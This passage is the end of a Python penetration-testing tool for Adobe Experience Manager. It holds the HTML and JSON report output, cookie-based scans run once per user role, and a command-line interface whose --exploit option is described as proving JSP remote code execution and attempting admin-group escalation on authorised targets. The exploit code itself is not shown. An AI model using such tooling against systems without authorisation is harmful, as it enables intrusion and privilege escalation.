  background: #0d1117; color: #c9d1d9; padding: 24px;
  max-width: 1200px; margin: 0 auto; line-height: 1.5;
}
h1 { color: #58a6ff; margin-bottom: 4px; }
.target { color: #8b949e; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
.summary { display: flex; gap: 12px; margin: 18px 0; flex-wrap: wrap; }
.card { padding: 10px 16px; border-radius: 6px; font-weight: 600; font-size: 13px; }
.c-CRITICAL { background: #6f1d1f; color: #ffe2dc; }
.c-HIGH { background: #7d2a1e; color: #ffd1c4; }
.c-MEDIUM { background: #745c00; color: #f7e1a1; }
.c-LOW { background: #1f4d6b; color: #c8ecff; }
.c-INFO { background: #2a2f3a; color: #aab2c5; }
.finding {
  background: #161b22; border: 1px solid #30363d; border-radius: 8px;
  padding: 16px 18px; margin: 12px 0;
}
.finding h3 { margin: 0 0 4px 0; color: #f0f6fc; }
.meta { color: #8b949e; font-size: 13px; margin: 6px 0; }
.badge {
  display: inline-block; padding: 2px 8px; border-radius: 4px;
  font-size: 11px; margin-right: 6px; font-weight: 600;
}
.b-CRITICAL { background: #6f1d1f; color: #ffadad; }
.b-HIGH { background: #7d2a1e; color: #ffc4b3; }
.b-MEDIUM { background: #745c00; color: #f7e1a1; }
.b-LOW { background: #1f4d6b; color: #b6e1ff; }
.b-INFO { background: #2a2f3a; color: #aab2c5; }
.b-cve { background: #4d1c1c; color: #ffadad; }
.b-cat { background: #1f3a5f; color: #b6e1ff; }
.b-role { background: #2f4a1f; color: #c9ecb5; }
pre {
  background: #0d1117; border: 1px solid #30363d; padding: 10px;
  border-radius: 4px; overflow-x: auto; font-size: 12px;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  white-space: pre-wrap; word-break: break-word;
}
a { color: #58a6ff; text-decoration: none; }
a:hover { text-decoration: underline; }
.foot { color: #8b949e; font-size: 12px; margin-top: 36px;
        border-top: 1px solid #30363d; padding-top: 12px; }
"""


def render_html_report(target: str, findings: List[Finding], summary: Dict[str, int]) -> str:
    sev_cards = "".join(
        f'<div class="card c-{sev}">{sev}: {count}</div>'
        for sev, count in sorted(summary.items(), key=lambda kv: -SEV_ORDER.get(kv[0], 0))
    )

    cards_html: List[str] = []
    for f in findings:
        refs_html = ""
        if f.references:
            refs_html = "<div class='meta'>Refs: " + " &middot; ".join(
                f'<a href="{html_mod.escape(r)}" target="_blank" rel="noopener">{html_mod.escape(r)}</a>'
                for r in f.references) + "</div>"
        cve_badge = (f'<span class="badge b-cve">{html_mod.escape(f.cve)}</span>'
                     if f.cve else "")
        role_badge = (f'<span class="badge b-role">{html_mod.escape(f.role)}</span>'
                      if f.role else "")
        req_block = (f'<div class="meta">Request</div><pre>{html_mod.escape(f.request)}</pre>'
                     if f.request else "")
        resp_block = (f'<div class="meta">Response snippet</div><pre>{html_mod.escape(f.response_snippet)}</pre>'
                      if f.response_snippet else "")
        ev_block = (f'<div class="meta">Evidence</div><pre>{html_mod.escape(f.evidence)}</pre>'
                    if f.evidence else "")
        desc_block = (f'<p>{html_mod.escape(f.description)}</p>' if f.description else "")
        cards_html.append(
            f'<div class="finding">'
            f'<h3>{html_mod.escape(f.title)}</h3>'
            f'<div class="meta">'
            f'<span class="badge b-{f.severity}">{f.severity}</span>'
            f'<span class="badge b-cat">{html_mod.escape(f.category)}</span>'
            f'{cve_badge}{role_badge}'
            f'</div>'
            f'<div class="meta">Target: <code>{html_mod.escape(f.target)}</code></div>'
            f'{desc_block}{ev_block}{req_block}{resp_block}{refs_html}'
            f'</div>'
        )

    body = (
        f'<h1>AEM Hunter Report</h1>'
        f'<div class="target">Target: {html_mod.escape(target)}</div>'
        f'<div class="target">Generated: {dt.datetime.now().isoformat(timespec="seconds")}</div>'
        f'<div class="summary">{sev_cards}</div>'
        f'{"".join(cards_html) or "<p>No findings.</p>"}'
        f'<div class="foot">aem-hunter v{VERSION} &middot; for authorized testing only.</div>'
    )

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>AEM Hunter Report - {html_mod.escape(target)}</title>
<style>{HTML_STYLE}</style>
</head>
<body>
{body}
</body>
</html>"""


# ---------------------------------------------------------------------------
# Reporting outputs
# ---------------------------------------------------------------------------
def write_reports(target: str, findings: List[Finding], summary: Dict[str, int],
                  output_dir: str, logger: Logger, label: Optional[str] = None) -> List[str]:
    os.makedirs(output_dir, exist_ok=True)
    ts = dt.datetime.now().strftime("%Y%m%d-%H%M%S")
    host = short_host(target)
    lbl = ""
    if label:
        lbl = "-" + re.sub(r"[^a-z0-9]+", "-", label.lower()).strip("-")
    base = os.path.join(output_dir, f"report-{host}{lbl}-{ts}")
    json_path = base + ".json"
    html_path = base + ".html"

    with open(json_path, "w") as fh:
        json.dump({
            "tool": "aem-hunter",
            "version": VERSION,
            "target": target,
            "scan": label or "unauthenticated",
            "generated": dt.datetime.now().isoformat(timespec="seconds"),
            "summary": summary,
            "findings": [asdict(f) for f in findings],
        }, fh, indent=2)
    logger.good(f"JSON report: {json_path}")

    with open(html_path, "w") as fh:
        fh.write(render_html_report(target, findings, summary))
    logger.good(f"HTML report: {html_path}")
    return [json_path, html_path]


# ---------------------------------------------------------------------------
# One scan = one cookie set (or none). Each scan writes its own report.
# ---------------------------------------------------------------------------
def run_one_scan(target: str, cookies: Optional[Dict[str, str]], label: str,
                 proxy: Optional[str], output_dir: str, logger: Logger,
                 exploit: bool = False, use_http2: bool = False) -> List[str]:
    logger.section(f"SCAN: {label}")
    reporter = Reporter(logger)

    # ---- Preflight WITHOUT cookies: is the target even reachable from here? ----
    # This distinguishes "target down / IP blocked / wrong egress / HTTP-2-only"
    # from "cookies are bad". Without it, every request returns ERR and the whole
    # scan looks empty for no obvious reason.
    pre = HttpClient(base_url=target, timeout=15, proxy=proxy, threads=2,
                     verify=False, rate_limit=0.0, logger=logger, use_http2=use_http2)
    rp = pre.get("/") or pre.get("/libs/granite/core/content/login.html") or pre.get("/system/console")
    if rp is None:
        err = pre.last_error or "no response"
        logger.err(f"[{label}] TARGET UNREACHABLE (no cookies): {err}")
        # Most common enterprise cause: the server only speaks HTTP/2.
        if "HTTP/2" in err or "UnknownProtocol" in err or "ProtocolError" in err:
            logger.err("CAUSE: the target speaks HTTP/2, which Python 'requests' cannot. Fix EITHER:")
            logger.err("  A) Route through Burp/mitmproxy (it downgrades h2->h1.1):")
            logger.err("       --proxy http://127.0.0.1:8080        <-- you confirmed this works")
            logger.err("  B) Use the native HTTP/2 backend (no proxy needed):")
            logger.err("       pip install 'httpx[http2]'  then add  --http2")
            if not _HAS_HTTPX:
                logger.err("     (httpx is not currently installed, so --http2 needs the pip install first)")
        else:
            logger.err("Likely causes:")
            logger.err("  1. Network/VPN to the target is down, or the host is offline.")
            logger.err("  2. You normally egress through Burp — pass --proxy http://127.0.0.1:8080.")
            logger.err("  3. A WAF/IPS blocked your source IP (the aggressive --exploit run can")
            logger.err("     trip this). Try from a different IP / wait, or confirm with:")
            logger.err(f"        curl -k -I {target}/")
        logger.err("Re-run with -v to see the exact per-request error. Skipping this scan.")
        return []
    logger.good(f"[{label}] target reachable -> HTTP {rp.status_code} "
                f"(backend={pre.backend}{'/h2' if pre.backend == 'httpx' else ''})")

    client = HttpClient(
        base_url=target, timeout=15, proxy=proxy, threads=10,
        verify=False, cookies=cookies, rate_limit=0.0, logger=logger, use_http2=use_http2,
    )

    # Quick session sanity check so you know your pasted cookies actually work.
    if cookies:
        who = client.get("/libs/granite/security/currentuser.json")
        if who is not None and who.status_code == 200:
            m = re.search(r'"(?:userID|authorizableId|id)"\s*:\s*"([^"]+)"', who.text or "")
            uid = m.group(1) if m else "?"
            if uid.lower() == "anonymous":
                logger.warn(f"[{label}] cookies resolve to ANONYMOUS — session looks "
                            f"invalid/expired. Scanning anyway.")
            else:
                logger.good(f"[{label}] authenticated as: {uid}")
        elif who is None:
            # Raw connectivity worked above, so a cookied request failing points
            # at the Cookie header itself (bad char / oversized / too many).
            logger.err(f"[{label}] connectivity is fine but the COOKIED request errored: "
                       f"{client.last_error or 'unknown'}")
            logger.err(f"[{label}] -> your pasted Cookie header is likely the problem "
                       f"({len(cookies)} cookies). Check for stray characters/newlines, or "
                       "an oversized header. Re-copy the Cookie value from DevTools.")
        else:
            logger.warn(f"[{label}] could not confirm session via currentuser.json "
                        f"(HTTP {who.status_code}). Scanning anyway.")

    hunter = AEMHunter(
        target=target, logger=logger, reporter=reporter, client=client,
        threads=10, role=(label if cookies else None),
        enable_modules=None, fuzz_aggression="normal", exploit=exploit,
    )
    hunter.run()

    summary = reporter.summary()
    logger.section(f"Summary [{label}]")
    for sev in (SEV_CRITICAL, SEV_HIGH, SEV_MEDIUM, SEV_LOW, SEV_INFO):
        logger.finding(sev, f"{summary.get(sev, 0)} {sev}")
    return write_reports(target, reporter.by_severity(), summary, output_dir, logger, label=label)


# ---------------------------------------------------------------------------
# CLI — minimal: URL + cookie. Everything else is optional with sane defaults.
# ---------------------------------------------------------------------------
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="aem_hunter.py",
        description="Adobe Experience Manager audit tool. Paste cookies, scan, repeat.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              python3 aem_hunter.py
              python3 aem_hunter.py https://aem.example.com
              python3 aem_hunter.py -u https://aem.example.com -c "login-token=...; cq-authoring-mode=TOUCH"
              python3 aem_hunter.py -u TARGET --proxy http://127.0.0.1:8080

            After each scan finishes you are prompted to paste the next Cookie
            header (the next user role). It keeps scanning with whatever you
            paste. Press Enter on an empty prompt for an unauthenticated scan,
            or type q to quit. Every scan writes its own JSON + HTML report.

            By default the active-escalation module CONFIRMS capabilities safely
            (it creates then immediately deletes throwaway test artifacts). Add
            --exploit to additionally prove end-to-end RCE (drops and removes a
            canary JSP) and attempt admin-group escalation. Only use --exploit
            on systems you are authorized to actively exploit.
            """),
    )
    p.add_argument("target", nargs="?", help="Target URL (e.g. https://aem.example.com)")
    p.add_argument("-u", "--url", help="Target URL (same as the positional argument)")
    p.add_argument("-c", "--cookie", help="Cookie header to use for the first scan (optional)")
    p.add_argument("--proxy", help="Route through a proxy, e.g. http://127.0.0.1:8080 (optional)")
    p.add_argument("--http2", action="store_true",
                   help="Use the native HTTP/2 backend (httpx) for targets that only speak "
                        "HTTP/2. Needs: pip install 'httpx[http2]'. Avoids needing a downgrading proxy.")
    p.add_argument("-o", "--output-dir", default=".", help="Where to write reports (default: current dir)")
    p.add_argument("--exploit", action="store_true",
                   help="Enable destructive end-to-end PoCs: JSP RCE (drops+removes a canary) "
                        "and admin-group escalation. Authorized targets only.")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    p.add_argument("--version", action="version", version=f"aem-hunter {VERSION}")
    return p.parse_args()


def _read_cookie_input(raw: str, logger: Logger) -> Optional[str]:
    """Resolve an '@/path/to/file' reference, else return the string as-is."""
    if raw.startswith("@"):
        path = raw[1:].strip()
        try:
            with open(path, "r") as fh:
                return fh.read().strip()
        except OSError as e:
            logger.err(f"Could not read cookie file {path}: {e}")
            return None
    return raw


def main() -> int:
    ns = parse_args()
    logger = Logger(verbose=ns.verbose)
    print(BANNER.format(ver=VERSION))

    target = ns.url or ns.target
    if not target:
        try:
            target = input("Target URL (e.g. https://aem.example.com): ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 1
    if not target:
        logger.err("No target URL provided.")
        return 2
    target = normalize_target(target)

    proxy = ns.proxy
    output_dir = ns.output_dir or "."

    logger.info(f"Target: {target}")
    if proxy:
        logger.info(f"Proxy: {proxy}")
    if ns.http2:
        if _HAS_HTTPX:
            logger.info("HTTP/2 backend: ON (httpx)")
        else:
            logger.warn("--http2 set but httpx is not installed. Run: pip install 'httpx[http2]'")
    if ns.exploit:
        logger.warn("--exploit ON: will attempt JSP RCE PoC + admin escalation (with cleanup). "
                    "Authorized targets only.")
    print()
    logger.info("How this works:")
    logger.info("  - Paste a Cookie header + Enter  -> authenticated scan with those cookies")
    logger.info("  - Just press Enter (blank)       -> unauthenticated scan")
    logger.info("  - Prefix with @ to read a file   -> e.g.  @/tmp/editor.txt")
    logger.info("  - Type q + Enter (or Ctrl-C)     -> finish and exit")
    print()

    all_reports: List[str] = []
    n_auth = 0
    pending = ns.cookie  # use --cookie for the very first scan if given

    while True:
        if pending is not None:
            raw = pending.strip()
            pending = None
            logger.info("Using cookies from --cookie for this scan.")
        else:
            try:
                raw = input("[?] Paste Cookie header (Enter=unauth, q=quit): ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

        if raw.lower() in ("q", "quit", "exit"):
            break

        if raw:
            resolved = _read_cookie_input(raw, logger)
            if resolved is None:
                continue
            cookies = parse_cookie_string(resolved)
            if not cookies:
                logger.err("Could not parse any cookies from that input. Try again.")
                continue
            n_auth += 1
            label = f"cookie-set-{n_auth}"
            logger.good(f"Loaded {len(cookies)} cookie(s) -> {label}")
        else:
            cookies = None
            label = "unauthenticated"

        try:
            all_reports.extend(run_one_scan(target, cookies, label, proxy, output_dir,
                                            logger, exploit=ns.exploit, use_http2=ns.http2))
        except KeyboardInterrupt:
            logger.warn("Scan interrupted; moving on.")
        print()
        logger.info("Scan complete. Paste the next role's cookies, or q to quit.")

    if all_reports:
        logger.section("Reports written this session")
        for pth in all_reports:
            logger.good(pth)
    else:
        logger.warn("No scans were run.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
